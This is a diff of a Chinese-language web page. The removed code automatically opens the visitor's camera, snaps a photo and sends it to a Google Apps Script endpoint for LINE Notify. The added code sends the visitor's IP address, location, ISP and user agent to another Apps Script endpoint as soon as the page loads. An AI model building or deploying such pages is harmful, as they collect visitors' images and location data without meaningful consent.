@@ -1,83 +1,52 @@
 <!DOCTYPE html>
-<html lang="zh-TW">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>LINE Notify 自動拍照傳送</title>
+  <title>IP 定位與設備訊息記錄</title>
 </head>
 <body>
-  <h1>LINE Notify 自動拍照並傳送</h1>
-  <!-- 相機畫面 -->
-  <video id="camera" autoplay playsinline style="max-width: 100%; height: auto;"></video>
-  <br>
-  <!-- 照片預覽 -->
-  <canvas id="canvas" style="display: none;"></canvas>
-  <p id="status">狀態：啟動中...</p>
+  <h1>自動記錄 IP 資訊與設備訊息</h1>
+  <p id="ipInfo">IP 資訊載入中...</p>
+  <p id="status">尚未開始操作</p>
 
   <script>
-    const camera = document.getElementById('camera');
-    const canvas = document.getElementById('canvas');
-    const statusElement = document.getElementById('status');
-
-    // 啟動相機
-    async function startCamera() {
+    async function getIpInfo() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-        camera.srcObject = stream;
+        const response = await fetch('https://ipinfo.io/json');
+        const data = await response.json();
+        const { ip, city, region, country, org } = data;
+        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
+        const userAgent = navigator.userAgent;
 
-        // 等待相機啟動後拍照並傳送
-        camera.addEventListener('loadeddata', () => {
-          setTimeout(() => {
-            takePhotoAndSend();
-          }, 1000); // 延遲 1 秒拍照
-        });
-      } catch (error) {
-        console.error('無法啟動相機:', error);
-        statusElement.innerText = '無法啟動相機，請檢查權限或設備相機';
-      }
-    }
+        document.getElementById('ipInfo').innerText = `
+          IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}
+        `;
 
-    // 拍攝照片並傳送到後端
-    async function takePhotoAndSend() {
-      try {
-        const context = canvas.getContext('2d');
-        canvas.width = camera.videoWidth;
-        canvas.height = camera.videoHeight;
+        const url = new URL('https://script.google.com/macros/s/AKfycbyj4eZcWRnq3GFvFXISfD-cKuh_ZMS_Uok20hISsSQyNIG0CktLL0H16ZHM8MHi_xRzHw/exec');
+        url.searchParams.append('ip', ip);
+        url.searchParams.append('ipType', ipType);
+        url.searchParams.append('userAgent', userAgent);
+        url.searchParams.append('city', city);
+        url.searchParams.append('region', region);
+        url.searchParams.append('country', country);
+        url.searchParams.append('org', org);
 
-        // 將相機畫面繪製到 Canvas
-        context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+        const result = await fetch(url);
+        const responseData = await result.json();
 
-        // 壓縮並獲取 Base64
-        const photoData = canvas.toDataURL('image/jpeg', 0.5); // 壓縮至 50% 品質
-        const base64Image = photoData.split(',')[1]; // 去掉 Base64 的 DataURL 前綴
-
-        // 構造表單資料
-        const formData = new URLSearchParams();
-        formData.append('message', '自動拍照圖片');
-        formData.append('imageData', base64Image);
-
-        // 發送 POST 請求到 Google Apps Script
-        const response = await fetch('https://script.google.com/macros/s/AKfycbxp4orLZFxJKaY2MRpox5ea1REZopoi-95e3KHGaHds4a3Rj3Jk4YwvV7ICimG0h_Qh1w/exec', { // 替換為您的 Google Apps Script 部署 URL
-          method: 'POST',
-          body: formData,
-        });
-
-        const result = await response.json();
-
-        // 更新狀態
-        if (result.success) {
-          statusElement.innerText = '照片已成功傳送到 LINE Notify！';
+        if (responseData.success) {
+          document.getElementById('status').innerText = '上傳成功！';
         } else {
-          statusElement.innerText = `通知發送失敗：${result.error}`;
+          document.getElementById('status').innerText = '上傳失敗！';
         }
       } catch (error) {
-        console.error('發送過程中發生錯誤:', error);
-        statusElement.innerText = '發送過程中發生錯誤，請檢查控制台。';
+        console.error('錯誤:', error);
+        document.getElementById('status').innerText = '操作失敗，請檢查控制台。';
       }
     }
 
-    // 啟動相機
-    startCamera();
+    getIpInfo();
   </script>
 </body>
 </html>
